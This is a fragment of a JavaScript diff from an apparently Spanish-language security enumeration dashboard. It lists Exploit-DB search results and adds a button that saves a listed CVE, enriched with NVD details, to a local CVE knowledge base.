     out.innerHTML='<div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-bottom:6px;">'+data.count+' resultado(s) en Exploit-DB:</div>'+
       data.exploits.map(e=>`<div class="enum-cmd-card" style="margin-bottom:6px;">
         <a href="${esc(e.url)}" target="_blank" style="color:var(--cyan);font-size:12px;text-decoration:none;">${esc(e.title)} ↗</a>
         <div class="enum-meta" style="margin-top:4px;">${e.type?`<span>${esc(e.type)}</span>`:''}${e.platform?`<span>${esc(e.platform)}</span>`:''}${e.date?`<span>${esc(e.date)}</span>`:''}${e.cve?`<span class="auth-tag auth-req">${esc(e.cve)}</span>`:''}${e.verified?'<span class="noise-tag noise-low">✓ verificado</span>':''}</div>
+        ${e.cve?`<button class="enum-save-btn" style="margin-top:6px;" onclick='saveCveFromEnum(${jarg(e.cve)},this)' title="Guardar ${esc(e.cve)} en la KB de CVEs">💾 Guardar CVE</button>`:''}
       </div>`).join('');
   }catch(err){
     out.innerHTML='<div style="color:var(--red);font-size:11px">Error consultando Exploit-DB: '+esc(err.message)+'</div>';
+  }
+}
+
+// Guarda en la KB de CVEs un CVE que aparece en un resultado de Exploit-DB
+// (buscador "Versión → exploit conocido" de Enumeración). Guarda solo el ID;
+// luego, en el módulo CVEs, "↻ Enriquecer" trae CVSS/severidad/descripción de NVD.
+async function saveCveFromEnum(cveId, btn){
+  const orig=btn.textContent; btn.disabled=true; btn.textContent='⟳…';
+  try{
+    // Traemos la ficha de NVD para guardarlo ya con descripción/CVSS/severidad;
+    // guardar solo el ID lo dejaba "sin descripción". Si NVD no responde, fallback
+    // a guardar solo el ID (luego se puede "↻ Enriquecer" desde el módulo CVEs).
+    let payload={cve_id:cveId};
+    try{
+      const nvd=await API.get('/api/cve-lookup?id='+encodeURIComponent(cveId));
+      if(nvd && nvd.found) payload={cve_id:cveId, description:nvd.description, severity:nvd.severity, cvss:nvd.cvss};
+    }catch(_){ /* NVD caído → guardamos solo el ID */ }
+    const r=await API.post('/api/cves', payload);
+    S.cves=await API.get('/api/cves');
+    renderCVEs();   // refresca la lista de CVEs aunque estemos en la pestaña de Enum (sin F5)
+    btn.textContent=r.created?'✓ Guardado':'✓ Ya estaba';
+    btn.style.color='var(--green)'; btn.style.borderColor='var(--green)';
+    setStatus(r.created?('CVE '+cveId+' guardado en la KB'):('CVE '+cveId+' ya estaba en la KB'));
+  }catch(e){
+    btn.disabled=false; btn.textContent=orig;
+    setStatus('No se pudo guardar '+cveId+': '+e.message,'error');
   }
 }
 function onSvcPortsChanged(){
